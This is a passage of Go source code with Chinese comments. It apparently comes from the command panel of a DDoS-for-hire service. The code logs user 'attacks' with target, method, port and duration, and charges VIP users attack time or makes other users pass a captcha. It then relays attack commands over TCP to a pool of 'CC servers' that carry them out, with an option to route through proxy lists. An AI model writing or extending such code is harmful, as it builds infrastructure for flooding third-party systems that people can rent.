	return maskLen == 16 || maskLen == 24 || maskLen == 30 || maskLen == 32

}

// 验证 IP 地址
func isValidIP(address string) bool {
	return net.ParseIP(address) != nil
}

// 验证网址
func isValidURL(address string) bool {
	return regexp.MustCompile(`^https?://.*$`).MatchString(address)
}

var userCooldownMutex sync.Mutex // 添加互斥锁
// 设置用户的冷却时间
func setCooldown(username string) {
	userCooldownMutex.Lock()         // 加锁
	defer userCooldownMutex.Unlock() // 解锁

	cooldownDuration := rand.Intn(31) + 40 // 随机生成 90-120 秒的冷却时间
	cooldownEnd := time.Now().Add(time.Duration(cooldownDuration) * time.Second)
	userCooldown.Store(username, cooldownEnd)
}

// 检查用户的冷却时间，返回剩余冷却时间（秒）
func checkCooldown(username string) int {
	cooldownEnd, ok := userCooldown.Load(username)
	if !ok {
		return 0 // 如果没有记录，则认为没有冷却时间
	}

	remainingCooldown := int(cooldownEnd.(time.Time).Sub(time.Now()).Seconds())
	if remainingCooldown > 0 {
		return remainingCooldown
	} else {
		userCooldown.Delete(username) // 冷却时间结束，删除记录
		return 0
	}
}

func verifyCaptcha(session *sessions.Session_Store) bool {
	username := session.User.Username

	// 1. 检查用户是否在豁免期内
	lastVerifyTime, ok := userLastCaptchaVerify.Load(username)
	if ok {
		if time.Since(lastVerifyTime.(time.Time)) < captchaGracePeriod {
			session.Channel.Write([]byte("\r\n验证码豁免期内，跳过验证。\r\n")) // 可选：给用户反馈
			return true                                            // 在豁免期内，直接返回成功
		} else {
			// 豁免期已过，删除旧记录（可选，不删也没关系，下次会覆盖）
			userLastCaptchaVerify.Delete(username)
		}
	}

	// 2. 如果不在豁免期内 或 从未验证过，则执行验证流程
	// 生成随机加减法算式
	// rand.Seed(time.Now().UnixNano()) // 注意：全局 Seed 一次即可，或者放在 main/init 中。频繁 Seed 可能导致随机性下降。
	// 如果没有在其他地方 Seed 过，这里保留也行，但不是最佳实践。
	num1 := rand.Intn(16)
	num2 := rand.Intn(16)
	operator := "+"
	// 修正：确保减法结果非负，避免用户困惑
	if rand.Intn(2) == 0 {
		operator = "-"
		// 确保 num1 >= num2
		if num1 < num2 {
			num1, num2 = num2, num1 // 交换两者
		}
	}

	correctAnswer := 0
	if operator == "+" {
		correctAnswer = num1 + num2
	} else {
		correctAnswer = num1 - num2
	}

	// 显示算式并获取用户输入
	session.Channel.Write([]byte(fmt.Sprintf("\x1b[0m请计算以证明你是人类: %d %s %d = ?\r\n", num1, operator, num2)))
	Term := term.NewTerminal(session.Channel, "\x1b[0m答案> ")
	answerStr, err := Term.ReadLine()
	if err != nil {
		session.Channel.Write([]byte("\r\n输入错误，请重试。\r\n"))
		return false
	}

	// 校验答案
	answer, err := strconv.Atoi(strings.TrimSpace(answerStr)) // 去除可能的前后空格
	if err != nil || answer != correctAnswer {
		session.Channel.Write([]byte(fmt.Sprintf("\r\n答案错误 (正确答案: %d)。\r\n", correctAnswer)))
		return false
	}

	// 3. 验证通过，记录当前时间，并设置豁免期
	userLastCaptchaVerify.Store(username, time.Now())
	session.Channel.Write([]byte("\r\n验证通过。\r\n"))
	return true
}

func logAttackWithServer(cmd []string, session *sessions.Session_Store, server *AttackServer) {
	timeInt, _ := strconv.Atoi(cmd[3]) // 这里假设 cmd[3] 总是攻击时间，需要根据实际情况修改
	port, _ := strconv.Atoi(cmd[2])
	if Logged, error := database.LogAttack(&database.Attack{
		Username:   session.User.Username,
		Target:     cmd[1],
		Method:     cmd[0],
		Port:       port, // 使用 cmd[2] 作为端口
		Duration:   timeInt,
		End:        time.Now().Add(time.Duration(timeInt * int(time.Second))).Unix(),
		Created:    time.Now().Unix(),
		ServerIP:   server.Address,
		ServerPort: server.Port,
	}); error != nil || !Logged {
		log.Println(error)
		session.Channel.Write([]byte("无法识别你的攻击命令"))
	}
}

func getProxyFile(cmd []string) string {
	for _, arg := range cmd {
		if arg == "--cn" {
			return "cn.txt"
		}
	}
	return "proxies.txt"
}

// CC服务器
func executeRemoteCommand(cmd []string, session *sessions.Session_Store, command string) (*AttackServer, bool) {

	// 验证用户权限（VIP 或验证码）
	if session.User.Vip {
		if !deductAttackTime(session, cmd) {
			return nil, false // 扣除时间失败，直接返回
		}
		session.Channel.Write([]byte("你的攻击时间剩余：" + strconv.Itoa(session.User.Cooldown) + "秒\r\n"))
	} else {
		if !verifyCaptcha(session) {
			return nil, false // 验证码验证失败，直接返回
		}
	}

	selectedServer := findAvailableServer(session)
	if selectedServer == nil {
		session.Channel.Write([]byte("所有服务器都繁忙, 请稍后再试。\r\n"))
		return nil, false
	}

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", selectedServer.Address, selectedServer.Port), 5*time.Second)
	if err != nil {
		session.Channel.Write([]byte("连接服务器失败, 请稍后再试。\r\n"))
		return nil, false
	}
	defer conn.Close()

	_, err = conn.Write([]byte(command + "\n"))
	if err != nil {
		session.Channel.Write([]byte(fmt.Sprintf("发送命令失败: %v\r\n", err)))
		return nil, false
	}

	return selectedServer, true
}

// CC服务器
func findAvailableServer(session *sessions.Session_Store) *AttackServer {
	for _, server := range CCserver {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", server.Address, server.Port), 3*time.Second)
		if err != nil {
			continue //连接失败，尝试下一个服务器
		}
		defer conn.Close()
		_, err = conn.Write([]byte("check\n")) //发送check命令，让服务器检查资源
		if err != nil {
			continue
		}

		response, err := readResponse(conn)

		if err != nil {
			session.Channel.Write([]byte(fmt.Sprintf("服务器响应超时，请重新尝试。 \r\n")))
			continue // 读取响应失败，尝试下一个服务器
		}

		if strings.TrimSpace(response) == "true" {
			return &server
		}
	}
	return nil
}

func readResponse(conn net.Conn) (string, error) {
	conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // 设置读取超时时间
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		return "", err
	}
	return string(buffer[:n]), nil
}

// 辅助函数，用于检查 IP 地址是否在指定范围内
func isIPInRange(ip, startIP, endIP net.IP) bool {
	if ip == nil || startIP == nil || endIP == nil {
		return false
	}
	ip = ip.To16()
	startIP = startIP.To16()
	endIP = endIP.To16()

	// 比较 IP 地址
	if bytes.Compare(ip, startIP) >= 0 && bytes.Compare(ip, endIP) <= 0 {
		return true
	}
	return false
}
